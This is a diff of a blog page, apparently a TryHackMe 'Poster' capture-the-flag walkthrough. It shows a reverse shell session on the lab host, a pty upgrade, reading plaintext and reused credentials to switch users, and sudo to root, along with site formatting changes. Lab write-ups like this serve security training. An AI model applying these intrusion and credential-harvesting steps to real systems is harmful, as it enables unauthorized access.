+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.9.140.180:4444 -&gt; 10.10.211.18:35476<span class="o">)</span> at 2021-04-03 14:37:28 -0400
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>109<span class="o">(</span>postgres<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>117<span class="o">(</span>postgres<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>117<span class="o">(</span>postgres<span class="o">)</span>,116<span class="o">(</span>ssl-cert<span class="o">)</span>
+</span></span><span class="line"><span class="cl">python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">postgres@ubuntu:/var/lib/postgresql/9.5/main$ 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><hr />
 <h2 id="horizontal-privilege-escalations">Horizontal Privilege Escalations</h2>
 <h3 id="user-dark">User dark</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2436,24 +2436,24 @@ postgres@ubuntu:/var/lib/postgresql/9.5/main$
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">postgres@ubuntu:/home/dark<span class="nv">$ls</span> -la
-ls -la
-total <span class="m">28</span>
-drwxr-xr-x <span class="m">2</span> dark dark <span class="m">4096</span> Jul <span class="m">28</span>  <span class="m">2020</span> .
-drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Jul <span class="m">28</span>  <span class="m">2020</span> ..
--rw------- <span class="m">1</span> dark dark   <span class="m">26</span> Jul <span class="m">28</span>  <span class="m">2020</span> .bash_history
--rw-r--r-- <span class="m">1</span> dark dark  <span class="m">220</span> Aug <span class="m">31</span>  <span class="m">2015</span> .bash_logout
--rw-r--r-- <span class="m">1</span> dark dark <span class="m">3771</span> Aug <span class="m">31</span>  <span class="m">2015</span> .bashrc
--rwxrwxrwx <span class="m">1</span> dark dark   <span class="m">24</span> Jul <span class="m">28</span>  <span class="m">2020</span> credentials.txt
--rw-r--r-- <span class="m">1</span> dark dark  <span class="m">655</span> May <span class="m">16</span>  <span class="m">2017</span> .profile
-postgres@ubuntu:/home/dark$ cat credentials.txt
-dark:<span class="o">[</span>REDACTED<span class="o">]</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">postgres@ubuntu:/home/dark<span class="nv">$ls</span> -la
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">28</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> dark dark <span class="m">4096</span> Jul <span class="m">28</span>  <span class="m">2020</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Jul <span class="m">28</span>  <span class="m">2020</span> ..
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> dark dark   <span class="m">26</span> Jul <span class="m">28</span>  <span class="m">2020</span> .bash_history
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> dark dark  <span class="m">220</span> Aug <span class="m">31</span>  <span class="m">2015</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> dark dark <span class="m">3771</span> Aug <span class="m">31</span>  <span class="m">2015</span> .bashrc
+</span></span><span class="line"><span class="cl">-rwxrwxrwx <span class="m">1</span> dark dark   <span class="m">24</span> Jul <span class="m">28</span>  <span class="m">2020</span> credentials.txt
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> dark dark  <span class="m">655</span> May <span class="m">16</span>  <span class="m">2017</span> .profile
+</span></span><span class="line"><span class="cl">postgres@ubuntu:/home/dark$ cat credentials.txt
+</span></span><span class="line"><span class="cl">dark:<span class="o">[</span>REDACTED<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>User <code>dark</code> has his credentials stored in plain text in his home directory with <code>read-write-execute</code> for everybody.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2462,21 +2462,21 @@ dark:<span class="o">[</span>REDACTED<span class="o">]</span>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">postgres@ubuntu:/home/dark$ su dark 
-su dark 
-Password: <span class="o">[</span>REDACTED<span class="o">]</span>
-
-dark@ubuntu:~$ id
-id
-<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>dark<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>dark<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>dark<span class="o">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">postgres@ubuntu:/home/dark$ su dark 
+</span></span><span class="line"><span class="cl">su dark 
+</span></span><span class="line"><span class="cl">Password: <span class="o">[</span>REDACTED<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dark@ubuntu:~$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>dark<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>dark<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>dark<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We will use found credentials to login as <code>dark</code>.</p>
 <h3 id="user-alison">User alison</h3>
 <p>Searching for any files owned by another system user called <code>alison</code>, we will find a <code>config.php</code> located in <code>/var/www/html/</code> directory.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2490,23 +2490,23 @@ id
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">dark@ubuntu:/opt/ufw$ find / -user alison 2&gt;/dev/null
-find / -user alison 2&gt; /dev/null
-/home/alison
-/home/alison/.bashrc
-/home/alison/.bash_logout
-/home/alison/.nano
-/home/alison/.profile
-/home/alison/.bash_history
-/home/alison/.sudo_as_admin_successful
-/home/alison/.cache
-/home/alison/user.txt
-/var/www/html/config.php
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dark@ubuntu:/opt/ufw$ find / -user alison 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">find / -user alison 2&gt; /dev/null
+</span></span><span class="line"><span class="cl">/home/alison
+</span></span><span class="line"><span class="cl">/home/alison/.bashrc
+</span></span><span class="line"><span class="cl">/home/alison/.bash_logout
+</span></span><span class="line"><span class="cl">/home/alison/.nano
+</span></span><span class="line"><span class="cl">/home/alison/.profile
+</span></span><span class="line"><span class="cl">/home/alison/.bash_history
+</span></span><span class="line"><span class="cl">/home/alison/.sudo_as_admin_successful
+</span></span><span class="line"><span class="cl">/home/alison/.cache
+</span></span><span class="line"><span class="cl">/home/alison/user.txt
+</span></span><span class="line"><span class="cl">/var/www/html/config.php
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2517,21 +2517,21 @@ find / -user alison 2&gt; /dev/null
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">dark@ubuntu:/opt/ufw$ cat /var/www/html/config.php
-cat /var/www/html/config.php
-&lt;?php 
-	
-	<span class="nv">$dbhost</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">;</span>
-	<span class="nv">$dbuname</span> <span class="o">=</span> <span class="s2">&#34;alison&#34;</span><span class="p">;</span>
-	<span class="nv">$dbpass</span> <span class="o">=</span> <span class="s2">&#34;[REDACTED]&#34;</span><span class="p">;</span>
-	<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">&#34;mysudopassword&#34;</span><span class="p">;</span>
-?&gt;	
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dark@ubuntu:/opt/ufw$ cat /var/www/html/config.php
+</span></span><span class="line"><span class="cl">cat /var/www/html/config.php
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nv">$dbhost</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$dbuname</span> <span class="o">=</span> <span class="s2">&#34;alison&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$dbpass</span> <span class="o">=</span> <span class="s2">&#34;[REDACTED]&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">&#34;mysudopassword&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">?&gt;	
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Assuming <code>alison</code> reuses her passwords, we can login to her account with found credentials.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2540,21 +2540,21 @@ cat /var/www/html/config.php
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">dark@ubuntu:/opt/ufw$ su alison 
-su alison
-Password: <span class="o">[</span>REDACTED<span class="o">]</span>
-
-alison@ubuntu:/opt/ufw$ id
-id
-<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>alison<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>alison<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>alison<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,114<span class="o">(</span>lpadmin<span class="o">)</span>,115<span class="o">(</span>sambashare<span class="o">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dark@ubuntu:/opt/ufw$ su alison 
+</span></span><span class="line"><span class="cl">su alison
+</span></span><span class="line"><span class="cl">Password: <span class="o">[</span>REDACTED<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">alison@ubuntu:/opt/ufw$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>alison<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>alison<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>alison<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,114<span class="o">(</span>lpadmin<span class="o">)</span>,115<span class="o">(</span>sambashare<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><hr />
 <h2 id="vertical-privilege-escalation">Vertical Privilege Escalation</h2>
 <p>Running <code>sudo -l</code> command, we will check our sudo permissions. We can see that user <code>alison</code> can run <strong>any</strong> command on the system. Let us switch to the user <code>root</code> with the flag <code>-i</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2571,22 +2571,22 @@ id
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">alison@ubuntu:~$ sudo -l
-sudo -l
-<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> alison: <span class="o">[</span>REDACTED<span class="o">]</span>
-
-Matching Defaults entries <span class="k">for</span> alison on ubuntu:
-    env_reset, mail_badpass,
-    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User alison may run the following commands on ubuntu:
-    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
-alison@ubuntu:~$ sudo -i
-sudo -i
-root@ubuntu:~# id  
-id
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">alison@ubuntu:~$ sudo -l
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> alison: <span class="o">[</span>REDACTED<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> alison on ubuntu:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User alison may run the following commands on ubuntu:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</span></span><span class="line"><span class="cl">alison@ubuntu:~$ sudo -i
+</span></span><span class="line"><span class="cl">sudo -i
+</span></span><span class="line"><span class="cl">root@ubuntu:~# id  
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></br>
 <p><em>Thank you for reading this blog post.</em></p>
@@ -2780,29 +2780,6 @@ id
   
 </script>
     
-<div class="donation">
-  <div class="donation__message">
-    Share on
-  </div>
-  <div class="donation__icons">
-    
-    
-    
-      
-        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fposter%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
-        </a>
-      
-    
-      
-        <a href="https://twitter.com/intent/tweet?text=Poster%20%5bTryHackMe%5d&url=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fposter%2f&hashtags=enumeration%2cpostgres%2csql%2cprivilege%20escalation&via=" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
-        </a>
-      
-    
-  </div>
-</div>
-
 
     
     
@@ -2828,7 +2805,7 @@ id
     </div>
     <div class="whoami__desc">
       
-        Computer Science student interested in Penetration Testing, Cyber Defense, OSINT and Social Engineering
+        Cyber Security Analyst | Master&#39;s student of Computer Science
       
     </div>
     <div class="whoami__social">
@@ -3015,7 +2992,7 @@ id
 </div>
 
 
-<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>
+<script defer src="/js/swipe.min.9d61b979db5cc2a1ff3a5d410e881547a61b9d28bc23e811c49061d47df07ef3.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -4041,7 +4018,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 
             <p class="caption">
                 
-                    ©2022, All Rights Reserved
+                    ©2023, All Rights Reserved
                 
             </p>
         
